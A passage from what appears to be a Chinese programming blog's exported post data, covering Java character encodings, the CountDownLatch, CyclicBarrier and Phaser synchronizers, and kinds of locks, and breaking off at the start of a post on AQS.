全称是《信息交换用汉字编码字符集》，是我国的强制标准，它可能是单字节、双字节或者四字节编码，它的编码与 GB2312 编码兼容，这个虽然是国家标准，但是实际应用系统中使用的并不广泛。 UTF-16 说到 UTF 必须要提到 Unicode（Universal Code 统一码），ISO 试图想创建一个全新的超语言字典，世界上所有的语言都可以通过这本字典来相互翻译。可想而知这个字典是多么的复杂，关于 Unicode 的详细规范可以参考相应文档。Unicode 是 Java 和 XML 的基础，下面详细介绍 Unicode 在计算机中的存储形式。 UTF-16 具体定义了 Unicode 字符在计算机中存取方法。UTF-16 用两个字节来表示 Unicode 转化格式，这个是定长的表示方法，不论什么字符都可以用两个字节表示，两个字节是 16 个 bit，所以叫 UTF-16。UTF-16 表示字符非常方便，每两个字节表示一个字符，这个在字符串操作时就大大简化了操作，这也是 Java 以 UTF-16 作为内存的字符存储格式的一个很重要的原因。 UTF-8 UTF-16 统一采用两个字节表示一个字符，虽然在表示上非常简单方便，但是也有其缺点，有很大一部分字符用一个字节就可以表示的现在要两个字节表示，存储空间放大了一倍，在现在的网络带宽还非常有限的今天，这样会增大网络传输的流量，而且也没必要。而 UTF-8 采用了一种变长技术，每个编码区域有不同的字码长度。不同类型的字符可以是由 1~6 个字节组成。 UTF-8 有以下编码规则： 如果一个字节，最高位（第 8 位）为 0，表示这是一个 ASCII 字符（00 - 7F）。可见，所有 ASCII 编码已经是 UTF-8 了。 如果一个字节，以 11 开头，连续的 1 的个数暗示这个字符的字节数，例如：110xxxxx 代表它是双字节 UTF-8 字符的首字节。 如果一个字节，以 10 开始，表示它不是首字节，需要向前查找才能得到当前字符的首字节 char 的学习由于 Java 采用的是 16 位的 Unicode 字符集，即 UTF-16，所以在 Java 中 char 数据类型是定长的，其长度永远只有 16 位（2个字节），这里的定长是与 UTF-8 进行区别的，因为 UTF-8 使用变长机制来表示字符。 char 数据类型永远只能表示代码点在 U+0000 ~ U+FFFF 之间的字符： 最小值是 \\u0000（即为0）； 最大值是 \\uffff（即为65,535）； 如果代码点超过了这个范围，即使用了增补字符，那么 char 数据类型将无法支持，因为增补字符需要 32 位的长度来存储，我们只能转而使用 String 来存储这个字符。 Java 中使用 UnicodeJava 中使用 Unicode 的原因是，Java 的 Applet 允许全世界范围内运行，那它就需要一种可以表述人类所有语言的字符编码。 而当只表示 English，Spanish，German 或 French等语言时，根本不需要 2 个字节的长度这么长来表示，所以这时其实采用ASCII码会更高效。 因此，是采用 Unicode 还是 ASCII 来编码一个字符就存在一个权衡问题，即是获得更全的字符表达范围，还是使用更少的存储空间。 字符常量有三种表示形式单个字符直接通过单个字符来指定字符常量：例如，’A’、’a’、’8’、“中”等。 12345//直接指定单个字符的字符常量char aChar = &apos;a&apos;;//指定一个中字符常量char zhong = &apos;中&apos;; 转义字符通过转义字符表示特殊的字符常量：例如：’\\n’、’\\t’等。 有反斜杠（\\）在前的字符是一个转义序列并且对于编译器有特殊的意义。 换行符(\\n)在 System.out.println() 语句中经常使用，在字符串打印出来后换行。 以下的表格展示了 Java 转义序列： 转义序列 描述 \\t 在文本中插入一个标签。 \\b 在文本中插入一个退格。 \\n 在文本中插入一个换行符。 \\r 在文本中插入一个回车。 \\f 在文本中插入一个换页。 &#39; 在文本中插入一个单引号字符。 \\ 在文本中插入一个反斜杠字符。 Unicode 值直接使用 Unicode 值来表示字符常量。即使用一个十进制数，八进制数或十六进制数的整数来表示一个字符的 Unicode 值。 \\u 在 Java 中表示这是一个十六进制数。 当用一个十六进制整数赋值给 一个 char 时，格式是 ‘\\uXXXX’，其中XXXX代表一个十六进制的整数，范围是:’\\u0000’—-‘\\uFFFF’，一共可以表示65536个字符，其中前256个字符（’\\u0000’—‘\\u00FF’）和ASCII码中的字符完全重合。 12345678910111213//使用十六进制的字符的Unicode编码值来赋值char ch1 = &apos;\\u9999&apos;;int zhongValue=zhong;//用一个表示十进制数整数来表示Unicode编码值以赋值char ch2 = (char) zhongValue;//将会打印出“中”System.out.println(ch2);// “中”的 Unicode 值为 20013 (十进制)char ch3 = 20013;//将会打印出“中”System.out.println(ch3); Java 中如何编解码Charset 提供 encode 与 decode 分别对应 string 到 byte[] 的编码和 byte[] 到 char[] 的解码。如下代码所示： 123Charset charset = Charset.forName(\"UTF-8\"); ByteBuffer byteBuffer = charset.encode(string); CharBuffer charBuffer = charset.decode(byteBuffer); Reference Java 中 char 和 String 的细节和使用注意 - https://zhuanlan.zhihu.com/p/23654187 深入分析 Java 中的中文编码问题 - https://www.ibm.com/developerworks/cn/java/j-lo-chinesecoding/index.html Java 字符 - https://blog.csdn.net/sunzhenhua0608/article/details/7628663","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Java】多线程-线程间通信工具CountDownLatch、CyclicBarrier 和 Phaser 类","date":"2019-03-01T04:35:52.000Z","path":"2019/03/01/【Java】多线程-线程间通信工具CountDownLatch、CyclicBarrier-和-Phaser-类/","text":"本文将介绍常用的线程间通信工具 CountDownLatch、CyclicBarrier 和Phaser 的用法，并结合实例介绍它们各自的适用场景及相同点和不同点。 CountDownLatch 类CountDownLatch适用场景Java 多线程编程中经常会碰到这样一种场景——某个线程需要等待一个或多个线程操作结束（或达到某种状态）才继续执行。 比如开发一个并发测试工具时，耗时计算线程需要等到所有测试线程均执行完成再开始统计总共耗费的时间，此时可以通过 CountDownLatch 轻松实现。 CountDownLatch实例123456789101112131415161718192021222324252627282930import java.util.concurrent.CountDownLatch;public class Main &#123; public static void main(String[] args) throws InterruptedException &#123; int totalThread = 3; long start = System.currentTimeMillis(); CountDownLatch countDown = new CountDownLatch(totalThread); for(int i = 0; i &lt; totalThread; i++) &#123; final String threadName = \"Thread \" + i; new Thread(() -&gt; &#123; System.out.println(String.format(\"%s\\t%s %s\", System.currentTimeMillis(), threadName, \"started\")); try &#123; if (threadName.equals(\"Thread 0\")) Thread.sleep(1000); else if (threadName.equals(\"Thread 1\")) Thread.sleep(5000); else if (threadName.equals(\"Thread 2\")) Thread.sleep(3000); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; countDown.countDown(); System.out.println(String.format(\"%s\\t%s %s\", System.currentTimeMillis(), threadName, \"ended\")); &#125;).start();; &#125; countDown.await(); long stop = System.currentTimeMillis(); System.out.println(String.format(\"Total time : %sms\", (stop - start))); &#125;&#125; 执行结果12345671551413475740 Thread 2 started1551413475740 Thread 0 started1551413475740 Thread 1 started1551413476761 Thread 0 ended1551413478761 Thread 2 endedTotal time : 5076ms1551413480762 Thread 1 ended 分析可以看到，三个并发测试线程同时开始工作，当各线程完成测试时（分别耗时 1s、5s 和 3s ），分别调用 countDown.countDown(); 以通知耗时计算线程（这里对应主线程）。当 countDown 对象的计数值为 0 时，意味着全部的并发测试线程均完成工作，耗时计算线程收到通知，并计算耗时（忽略由于线程调度消耗而导致的误差，总测测试时长为 5s ）。 CountDownLatch主要接口分析CountDownLatch 工作原理相对简单，可以简单看成一个倒计数器，在构造方法中指定初始值，每次调用 countDown() 方法时将计数器减1，而调用 await() 会阻塞当前线程直到计数器变为 0 。CountDownLatch 关键接口如下 countDown() 如果当前计数器的值大于1，则将其减1；若当前值为1，则将其置为0并唤醒所有通过await等待的线程；若当前值为0，则什么也不做直接返回。 await() 等待计数器的值为0，若计数器的值为0则该方法返回；若等待期间该线程被中断，则抛出InterruptedException并清除该线程的中断状态。 await(long timeout, TimeUnit unit) 在指定的时间内等待计数器的值为0，若在指定时间内计数器的值变为0，则该方法返回true；若指定时间内计数器的值仍未变为0，则返回false；若指定时间内计数器的值变为0之前当前线程被中断，则抛出InterruptedException并清除该线程的中断状态。 getCount() 读取当前计数器的值，一般用于调试或者测试。 CyclicBarrierCyclicBarrier 适用场景内存屏障（Memory Barrier）能保证屏障之前的代码一定在屏障之后的代码之前被执行。 CyclicBarrier 可以译为循环屏障，也有类似的功能。 CyclicBarrier 可以在构造时指定需要在屏障前执行 await 的个数，所有线程对 await 的调用都导致自己被阻塞，直到调用await的次数达到预定值，此后所有被阻塞的线程都会立即被唤醒。 从使用场景上来说，CyclicBarrier 是让多个线程互相等待某一事件的发生，然后同时被唤醒。而上文讲的 CountDownLatch 是让某一线程等待多个线程的状态，然后该线程被唤醒。 CyclicBarrier 实例123456789101112131415161718192021222324252627282930313233343536import java.util.concurrent.CyclicBarrier;import java.util.Date;import java.util.concurrent.CyclicBarrier;public class Main &#123; public static void main(String[] args) &#123; int totalThread = 5; CyclicBarrier barrier = new CyclicBarrier(totalThread); for(int i = 0; i &lt; totalThread; i++) &#123; String threadName = \"Thread \" + i; long start = System.currentTimeMillis(); new Thread(() -&gt; &#123; System.out.println(String.format(\"%s\\t%s %s\",System.currentTimeMillis(), threadName, \" is waiting\")); try &#123; if (threadName.equals(\"Thread 0\")) Thread.sleep(1000); else if (threadName.equals(\"Thread 1\")) Thread.sleep(5000); else if (threadName.equals(\"Thread 2\")) Thread.sleep(3000); barrier.await(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; System.out.println(String.format(\"%s\\t%s %s\", System.currentTimeMillis(), threadName, \"ended\")); if (threadName.equals(\"Thread 0\")) &#123; long stop = System.currentTimeMillis(); System.out.println(String.format(\"Total time : %sms\", (stop - start))); &#125; &#125;).start(); &#125; &#125;&#125; 执行结果12345678910111551413441177 Thread 1 is waiting1551413441177 Thread 3 is waiting1551413441177 Thread 2 is waiting1551413441177 Thread 0 is waiting1551413441177 Thread 4 is waitingTotal time : 5076ms1551413446196 Thread 1 ended1551413446196 Thread 3 ended1551413446196 Thread 0 ended1551413446196 Thread 2 ended1551413446196 Thread 4 ended 分析可以看到，五个并发线程同时开始工作，（分别耗时 1s、5s、 3s、0s 和 0s ）后各线程到达同步节点，这时均调用 countDown.countDown() 以设置内存屏障。此后被阻塞，阻塞的时长由达到屏障（barrier）最晚的线程决定。直到所有线程均到达屏障（barrier），所有线程恢复执行。 PhaserPhaser适用场景CountDownLatch和CyclicBarrier都是JDK 1.5引入的，而Phaser是JDK 1.7引入的。Phaser的功能与CountDownLatch和CyclicBarrier有部分重叠，同时也提供了更丰富的语义和更灵活的用法。 Phaser顾名思义，与阶段相关。Phaser比较适合这样一种场景，一种任务可以分为多个阶段，现希望多个线程去处理该批任务，对于每个阶段，多个线程可以并发进行，但是希望保证只有前面一个阶段的任务完成之后才能开始后面的任务。这种场景可以使用多个CyclicBarrier来实现，每个CyclicBarrier负责等待一个阶段的任务全部完成。但是使用CyclicBarrier的缺点在于，需要明确知道总共有多少个阶段，同时并行的任务数需要提前预定义好，且无法动态修改。而Phaser可同时解决这两个问题。 Phaser实例12345678910111213141516171819202122232425public class PhaserDemo &#123; public static void main(String[] args) throws IOException &#123; int parties = 3; int phases = 4; final Phaser phaser = new Phaser(parties) &#123; @Override protected boolean onAdvance(int phase, int registeredParties) &#123; System.out.println(\"====== Phase : \" + phase + \" ======\"); return registeredParties == 0; &#125; &#125;; for(int i = 0; i &lt; parties; i++) &#123; int threadId = i; Thread thread = new Thread(() -&gt; &#123; for(int phase = 0; phase &lt; phases; phase++) &#123; System.out.println(String.format(\"Thread %s, phase %s\", threadId, phase)); phaser.arriveAndAwaitAdvance(); &#125; &#125;); thread.start(); &#125; &#125;&#125; 执行结果12345678910111213141516Thread 0, phase 0Thread 1, phase 0Thread 2, phase 0====== Phase : 0 ======Thread 2, phase 1Thread 0, phase 1Thread 1, phase 1====== Phase : 1 ======Thread 1, phase 2Thread 2, phase 2Thread 0, phase 2====== Phase : 2 ======Thread 0, phase 3Thread 1, phase 3Thread 2, phase 3====== Phase : 3 ====== 分析从上面的结果可以看到，多个线程必须等到其它线程的同一阶段的任务全部完成才能进行到下一个阶段，并且每当完成某一阶段任务时，Phaser都会执行其onAdvance方法。 Phaser主要接口分析Phaser主要接口如下： arriveAndAwaitAdvance() 当前线程当前阶段执行完毕，等待其它线程完成当前阶段。如果当前线程是该阶段最后一个未到达的，则该方法直接返回下一个阶段的序号（阶段序号从0开始），同时其它线程的该方法也返回下一个阶段的序号。 arriveAndDeregister() 该方法立即返回下一阶段的序号，并且其它线程需要等待的个数减一，并且把当前线程从之后需要等待的成员中移除。如果该Phaser是另外一个Phaser的子Phaser（层次化Phaser会在后文中讲到），并且该操作导致当前Phaser的成员数为0，则该操作也会将当前Phaser从其父Phaser中移除。 arrive() 该方法不作任何等待，直接返回下一阶段的序号。 awaitAdvance(int phase) 该方法等待某一阶段执行完毕。如果当前阶段不等于指定的阶段或者该Phaser已经被终止，则立即返回。该阶段数一般由arrive()方法或者arriveAndDeregister()方法返回。返回下一阶段的序号，或者返回参数指定的值（如果该参数为负数），或者直接返回当前阶段序号（如果当前Phaser已经被终止）。 awaitAdvanceInterruptibly(int phase) 效果与awaitAdvance(int phase)相当，唯一的不同在于若该线程在该方法等待时被中断，则该方法抛出InterruptedException。 awaitAdvanceInterruptibly(int phase, long timeout, TimeUnit unit) 效果与awaitAdvanceInterruptibly(int phase)相当，区别在于如果超时则抛出TimeoutException。 bulkRegister(int parties) 注册多个party。如果当前phaser已经被终止，则该方法无效，并返回负数。如果调用该方法时，onAdvance方法正在执行，则该方法等待其执行完毕。如果该Phaser有父Phaser则指定的party数大于0，且之前该Phaser的party数为0，那么该Phaser会被注册到其父Phaser中。 forceTermination() 强制让该Phaser进入终止状态。已经注册的party数不受影响。如果该Phaser有子Phaser，则其所有的子Phaser均进入终止状态。如果该Phaser已经处于终止状态，该方法调用不造成任何影响。 Reference Java进阶（四）线程间通信剖析 - http://www.jasongj.com/java/thread_communication/","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Lock】锁的几种特性","date":"2019-03-01T02:32:39.000Z","path":"2019/03/01/【Lock】锁的几种特性/","text":"我们来介绍一下与锁相关的几个概念。 可重入锁（Reentrant Lock） 可中断锁（Interruptable Lock） 可限时锁（Timed Lock） 公平锁（fair locking）和非公平锁（unfair locking） 读写锁（Read-Write Lock） 自旋锁（Spin Lock） 适应性自旋锁（Adaptive Spinning Lock） 偏向锁（Biased Lock） 可重入锁（Reentrant Lock）如果锁具备可重入性（Reentracy），则称作为可重入锁（Reentrant Lock）。可重入锁（Reentrant Lock）允许一个线程可以反复得到相同的一把锁， synchronized、 ReentrantLock 和 ReentrantReadWriteLock 都是可重入锁。 本质上，可重入锁有一个与锁相关的获取计数器，如果拥有锁的某个线程尝试再次得到锁，那么获取计数器就加1。最终，当锁被释放两次后，该锁才会真正被释放。 可重入锁对于锁基于线程的分配，而不是基于方法调用的分配。举个简单的例子，当一个线程执行到某个 synchronized 方法时，比如说 method1，而在 method1 中会调用另外一个 synchronized 方法 method2，此时线程不必重新去申请锁，而是可以直接执行 method2 方法。 以代码说明： 12345678class MyClass &#123; public synchronized void method1() &#123; method2(); &#125; public synchronized void method1() &#123; ... &#125;&#125; 上述代码中的两个方法 method1 和 method2 都是 synchronized 方法。 假如某一时刻，线程A执行到了 method1 ，此时线程A获取了这个对象的锁，而由于 method2 也是synchronized方法。假如 synchronized 不具备可重入性，此时当线程A 进入 method2 方法的调用时，需要重新申请锁。但是这就会造成一个问题，因为线程A已经持有了该对象的锁，而又在申请获取该对象的锁，这样就会线程A一直等待永远不会获取到的锁。 公平锁（fair locking）和非公平锁（unfair locking）何谓公平性（fairness），是针对获取锁而言的，如果一个锁是公平的，那么锁的获取顺序就应该符合线程请求锁时的绝对时间顺序，满足 FIFO。换句话说，等待时间最久的线程（最先请求的线程）会先获得该锁。 满足公平性的锁，就称为公平锁（fair locking），反之，称为非公平锁（unfair locking）。 在 Java 中，synchronized 就是非公平锁，它无法保证等待的线程获取锁的顺序。 而对于 ReentrantLock 和 ReentrantReadWriteLock，它在默认情况下是非公平锁，但是可以设置为公平锁。 公平锁 VS 非公平锁公平锁每次获取到锁为同步队列中的第一个节点，保证请求资源时间上的绝对顺序，而非公平锁有可能刚释放锁的线程下次继续获取该锁，则有可能导致其他线程永远无法获取到锁，造成“饥饿”现象（starvation）。 公平锁为了保证时间上的绝对顺序，需要频繁的上下文切换，而非公平锁会降低一定的上下文切换，降低性能开销。因此，ReentrantLock 默认选择的是非公平锁，则是为了减少一部分上下文切换，保证了系统更大的吞吐量。 可中断锁（Interruptable Lock）可中断锁 （Interruptible Lock ），顾名思义，就是可以被中断持有的锁。 比如，某一线程A正在执行锁中的代码，另一线程B正在等待获取该锁，由于等待时间过长，线程B急着想处理一个优先级相对更高的事务，我们可以让线程A中断自己正在持有的锁，或者线程B中断线程A正在持有的锁，这就是可中断锁（Interruptable Lock）。 在 Java 中，synchronized 就不是可中断锁，而 ReentrantLock 和 ReentrantReadWriteLock 都是可中断锁。 可中断锁解决死锁可中断锁可以帮助解决死锁（deadlock）问题，比如： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import java.util.concurrent.locks.ReentrantLock;public class IntLock implements Runnable&#123; public static ReentrantLock lock1 = new ReentrantLock(); public static ReentrantLock lock2 = new ReentrantLock(); int lock; /** * 控制加锁顺序，产生死锁 */ public IntLock(int lock) &#123; this.lock = lock; &#125; public void run() &#123; try &#123; if (lock == 1) &#123; lock1.lockInterruptibly(); // 如果当前线程未被中断，则获取锁。 try &#123; Thread.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; lock2.lockInterruptibly(); System.out.println(Thread.currentThread().getName()+\"，执行完毕！\"); &#125; else &#123; lock2.lockInterruptibly(); try &#123; Thread.sleep(500); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; lock1.lockInterruptibly(); System.out.println(Thread.currentThread().getName()+\"，执行完毕！\"); &#125; &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; // 查询当前线程是否保持此锁。 if (lock1.isHeldByCurrentThread()) &#123; lock1.unlock(); &#125; if (lock2.isHeldByCurrentThread()) &#123; lock2.unlock(); &#125; System.out.println(Thread.currentThread().getName() + \"，退出。\"); &#125; &#125; public static void main(String[] args) throws InterruptedException &#123; IntLock intLock1 = new IntLock(1); IntLock intLock2 = new IntLock(2); Thread thread1 = new Thread(intLock1, \"线程1\"); Thread thread2 = new Thread(intLock2, \"线程2\"); thread1.start(); thread2.start(); Thread.sleep(1000); thread2.interrupt(); // 中断线程2，且释放线程2持有的所有锁，同时放弃所有锁申请 &#125;&#125; 上述例子中，线程 thread1 和 thread2 启动后，thread1 立刻先占用 lock1，等待 500ms 后，再占用 lock2；thread2 反之，立刻先占 lock2，等待 500ms 后，后占 lock1。这便形成 thread1 和 thread2 之间的死锁。 当代码运行到 Thread.sleep(1000); 时，main 线程处于休眠（sleep）状态，两线程此时处于死锁的状态，thread2.interrupt(); 导致 thread2 被中断（interrupt），且释放 thread2 持有的所有锁，故 thread2 会放弃对 lock1 的申请。这个操作导致 thread1 最终顺利获得 lock2，从而最终解开了死锁。 可限时锁（Timed Lock）除了可中断锁外，可限时锁（Timed Lock）也可以在有些情况下避免死锁的发生。 ReentrantLock 是一种可限时锁（Timed Lock），它提供了 tryLock() 方法，并传入一个超时值作为参数。当在到达超时时间后，仍然没有获得锁，则放弃对锁的持有申请。 在 Java 中，synchronized就不是可限时锁，而 ReentrantLock 和 ReentrantReadWriteLock 都是可限时锁。 读写锁（Read-Write Lock）读写锁（Read-Write Lock）将对一个资源（比如文件）的访问分成了2个锁，一个读锁和一个写锁。 多个读锁之间是不需要互斥的（因为读操作不会改变数据，如果上了锁，反而会影响效率）; 而写锁和写锁之间需要互斥。也就是说，如果只是读数据，就可以多个线程同时读，但是如果要写数据，就必须互斥，使得同一时刻只有一个线程在操作。 正因为有了读写锁，才使得多个线程之间的读操作不会发生冲突。 ReadWriteLock 就是一个读写锁，它是一个接口，而 ReentrantReadWriteLock 实现了这个接口。 可以通过 readLock() 获取读锁，通过 writeLock() 获取写锁。 自旋锁（Spin Lock）背景在介绍自旋锁前，我们需要介绍一些前提知识来帮助大家明白自旋锁的概念。 阻塞或唤醒一个Java线程需要操作系统切换CPU状态来完成，这种状态转换需要耗费处理器时间。如果同步代码块中的内容过于简单，状态转换消耗的时间有可能比用户代码执行的时间还要长。 在许多场景中，同步资源的锁定时间很短，为了这一小段时间去切换线程，线程挂起和恢复现场的花费可能会让系统得不偿失。如果物理机器有多个处理器，能够让两个或以上的线程同时并行执行，我们就可以让后面那个请求锁的线程不放弃CPU的执行时间，看看持有锁的线程是否很快就会释放锁。 而为了让当前线程“稍等一下”，我们需让当前线程进行自旋，如果在自旋完成后前面锁定同步资源的线程已经释放了锁，那么当前线程就可以不必阻塞而是直接获取同步资源，从而避免切换线程的开销。这就是自旋锁。 自旋锁（Spin Lock）自旋锁（Spin Lock）是指当一个线程在申请获取锁的时候，如果锁已经被其它线程获取，那么该线程将循环等待，然后不断地判断锁是否能够被成功获取，直到获取到锁后，才会退出循环。 在这种情况中，尝试获取锁的线程一直处于活跃状态，但是并没有执行任何有效的任务，因此使用自旋锁（Spin Lock）会造成忙等待（busy-waiting）。 其实，自旋锁与互斥锁（Mutexes）比较类似，它们都是为了解决对某项资源的互斥使用。无论是互斥锁，还是自旋锁，在任何时刻，最多只能有一个保持者，也就说，在任何时刻最多只能有一个执行单元获得锁。但是两者在调度机制上略有不同。对于互斥锁，如果资源已经被占用，资源申请者只能进入睡眠状态。但是自旋锁不会引起调用者睡眠，如果自旋锁已经被别的执行单元保持，调用者就一直循环在那里看是否该自旋锁的保持者已经释放了锁，”自旋”一词就是因此而得名。 自旋锁的实现原理自旋锁基于CAS实现，AtomicInteger中调用unsafe进行自增操作的源码中的do-while循环就是一个自旋操作，如果修改数值失败则通过循环来执行自旋，直至修改成功。 自旋锁应用场景互斥同步最大的问题在于阻塞的实现，挂起和恢复线程的操作都分别需要进行内核态（kernel mode）与用户态（user mode）的一次转换，这给操作系统的并发带来了很大压力。 同时，虚拟机开发团队注意到很多应用上，共享数据的锁定状态只会持续很短一段时间，为了这段时间去挂起和恢复线程不值得。 所以我们可以让线程稍微等一下，而不放弃处理器的执行时间，看看持有锁的线程是否很快就释放了锁。这样的实现就是让线程执行一个循环（自旋），这就是自旋锁了。 在 JDK 1.6 中自旋锁就已经改为默认开启了。自旋等待不能代替阻塞，且不说对处理器数量的要求，自旋本身虽然避免了线程切换的开销，但是其需要占用处理器的时间，所以如果锁被占用的时间很短，自旋等待的效果就会非常好。反之如果锁被占用的时间很长，那么自旋的线程只会白白消耗处理器资源，而不会做任何有用的工作，反而会带来性能的浪费。 因此自旋等待的时间必须要有一定的限度，如果自旋超过了限定的次数仍然没有成功获得锁，就应当使用传统的方式去挂起线程了。自旋次数的默认值是 10 次，用户可以使用参数 -XX:PreBlockSpin 来更改。 适应性自旋锁（Adaptive Spinning Lock）在 JDK 1.6 中引入了自适应（adaptive）的自旋锁。自适应自旋锁（Adaptive Spinning Lock）意味着自旋的时间不再固定了，而是由前一次在同一个锁上的自旋时间及锁的拥有者的状态来决定。如果在同一个锁对象上，自旋等待刚刚成功获得过锁，并且持有锁的线程正在运行中，那么虚拟机就会认为这次自旋也很有可能再次成功，进而它将允许自旋等待持续相对更长的时间，比如100个循环。另一方面，如果对于某个锁，自旋很少成功获得过，那在以后要获取这个锁时将可能省略掉自旋过程，以避免浪费处理器资源。有了自适应自旋，随着程序运行和性能监控信息的不断完善，虚拟机对程序锁的状况预测就会越来越准确，虚拟机就会变得越来越“聪明”了。 Java 如何实现自旋锁？下面是个简单的例子： 1234567891011121314public class SpinLock &#123; private AtomicReference&lt;Thread&gt; cas = new AtomicReference&lt;Thread&gt;(); public void lock() &#123; Thread current = Thread.currentThread(); // 利用CAS while (!cas.compareAndSet(null, current)) &#123; // DO nothing &#125; &#125; public void unlock() &#123; Thread current = Thread.currentThread(); cas.compareAndSet(current, null); &#125;&#125; lock() 方法利用的CAS，当第一个线程 A 获取锁的时候，能够成功获取到，不会进入 while 循环，如果此时线程 A 没有释放锁，另一个线程 B 又来获取锁，此时由于不满足 CAS，所以就会进入 while 循环，不断判断是否满足 CAS ，直到 A 线程调用 unlock() 方法释放了该锁。 自旋锁存在的问题 如果某个线程持有锁的时间过长，就会导致其它等待获取锁的线程进入循环等待，消耗 CPU 。使用不当会造成 CPU 使用率极高。 上面 Java 实现的自旋锁不是公平的，即无法满足等待时间最长的线程优先获取锁。不公平的锁就会存在“线程饥饿”问题。 自旋锁的优点 自旋锁不会使线程状态发生切换，一直处于用户态，即线程一直都是active的；不会使线程进入阻塞状态，减少了不必要的上下文切换，执行速度快 非自旋锁在获取不到锁的时候会进入阻塞状态，从而进入内核态，当获取到锁的时候需要从内核态恢复，需要线程上下文切换。 （线程被阻塞后便进入内核（Linux）调度状态，这个会导致系统在用户态与内核态之间来回切换，严重影响锁的性能） 独享锁（Exclusive Lock） VS 共享锁（Shared Lock）独享锁（Exclusive Lock）也叫排他锁，是指该锁一次只能被一个线程所持有。如果线程T对数据A加上排它锁后，则其他线程不能再对A加任何类型的锁。获得排它锁的线程即能读数据又能修改数据。JDK中的synchronized和JUC中Lock的实现类就是互斥锁。 共享锁（Shared Lock）是指该锁可被多个线程所持有。典型的就是ReentrantReadWriteLock里的读锁，它的读锁是可以被共享的，但是它的写锁确每次只能被独占。 独享锁与共享锁也是通过AQS来实现的，通过实现不同的方法，来实现独享或者共享。 Reference 《深入理解Java虚拟机》 Java多线程编程那些事：Java虚拟机对内部锁的优化 - https://zhuanlan.zhihu.com/p/30003980 【深入理解多线程】 Java虚拟机的锁优化技术（五） - https://blog.csdn.net/w372426096/article/details/80079605 Java 并发：深入分析 synchronized 的实现原理 - https://juejin.im/entry/58a702b9128fe1006cb91707 JDK 5.0 中更灵活、更具可伸缩性的锁定机制 - https://www.ibm.com/developerworks/cn/java/j-jtp10264/index.html Java进阶（二）当我们说线程安全时，到底在说什么 - http://www.jasongj.com/java/thread_safe/ Java并发编程：Lock - https://www.cnblogs.com/dolphin0520/p/3923167.html 面试必备之深入理解自旋锁 - https://cloud.tencent.com/developer/article/1169074 读写自旋锁详解，第 1 部分 - https://www.ibm.com/developerworks/cn/linux/l-cn-rwspinlock1/index.html","comments":true,"categories":[{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/categories/Lock/"},{"name":"Java","slug":"Lock/Java","permalink":"http://swsmile.info/categories/Lock/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"},{"name":"Lock","slug":"Lock","permalink":"http://swsmile.info/tags/Lock/"}]},{"title":"【Java】锁 - AQS","date":"2019-02-28T07:54:35.000Z","path":"2019/02/28/【Java】锁-AQS/","text":"引言在 JDK1.5 之前，一般是靠 synchronized 关键字来实现线程对共享变量的互斥访问。synchronized是在字节码上加指令，依赖于底层操作系统的Mutex Lock实现。 而从JDK1.5以后，Java界的一位大神—— Doug Lea 开发了AbstractQueuedSynchronizer（AQS）组件，使用原生Java代码实现了synchronized语义。换句话说，Doug Lea没有使用更“高级”的机器指令，也不依靠JDK编译时的特殊处理，仅用一个普普通通的类就完成了代码块的并发访问控制，比那些费力不讨好的实现不知高到哪里去了。 java.util.concurrent包有多重要无需多言，一言以蔽之，是Doug Lea大爷对天下所有Java程序员的怜悯。 AQS定义了一套多线程访问共享资源的同步器框架，是整个java.util.concurrent包的基石，Lock、ReadWriteLock、CountDowndLatch、CyclicBarrier、Semaphore、ThreadPoolExecutor等都是在AQS的基础上实现的。 CAS（Compare And Swap）CAS 指的是现代 CPU 广泛支持的一种对内存中的共享数据进行操作的一种特殊指令。这个指令会对内存中的共享数据做原子的读写操作。简单介绍一下这个指令的操作过程： 首先，CPU 会先获取这个要修改的值的当前值，然后进行一个原子修改操作。在这个原子操作内部，会再次当这两个值相等时，CPU 才会将内存中的数值替换为新的值。否则便不做操作。最后，CPU 会将旧的数值返回。 这一系列的操作是原子的。它们虽然看似复杂，但却是 Java 5 并发机制优于原有锁机制的根本。简单来说，CAS 的含义是“我认为原有的值应该是什么，如果是，则将原有的值更新为新值，否则不做修改，并告诉我原来的值是多少”。 CAS通过调用JNI（Java Native Interface）调用实现的。JNI允许java调用其他语言，而CAS就是借助C语言来调用CPU底层指令实现的。Unsafe是CAS的核心类，它提供了硬件级别的原子操作 Doug Lea大神在java同步器中大量使用了CAS技术，鬼斧神工的实现了多线程执行的安全性。CAS不仅在AQS的实现中随处可见，也是整个java.util.concurrent包的基石。 AQS，非阻塞数据结构和原子变量类（java.util.concurrent.atomic包中的类），这些concurrent包中的基础类都是使用这种模式来实现的，而concurrent包中的高层类又是依赖于这些基础类来实现的。从整体来看，concurrent包的实现示意图如下： 在Java中，sun.misc.Unsafe 类提供了硬件级别的原子操作来实现这个CAS。 java.util.concurrent 包下的大量类都使用了这个 Unsafe.java 类的CAS操作。 同步队列当共享资源被某个线程占有，其他请求该资源的线程将会阻塞，从而进入同步队列。就数据结构而言，队列的实现方式无外乎两者一是通过数组的形式，另外一种则是链表的形式。AQS中的同步队列则是通过链式方式进行实现。接下来，很显然我们至少会抱有这样的疑问： 节点的数据结构是什么样的？ 是单向还是双向？ 是带头结点的还是不带头节点的？ 我们依旧先是通过看源码的方式。 在AQS有一个静态内部类Node，其中有这样一些属性： 1234567891011121314//节点状态 volatile int waitStatus //节点状态 volatile Node prev x //当前节点/线程的后继节点 volatile Node next; //加入同步队列的线程引用 volatile Thread thread;//等待队列中的下一个节点Node nextWaiter; 现在我们知道了节点的数据结构类型，并且每个节点拥有其前驱和后继节点，很显然这是一个双向队列。同样的我们可以用一段demo看一下。 12345678910111213141516171819public class LockDemo &#123; private static ReentrantLock lock = new ReentrantLock(); public static void main(String[] args) &#123; for (int i = 0; i &lt; 5; i++) &#123; Thread thread = 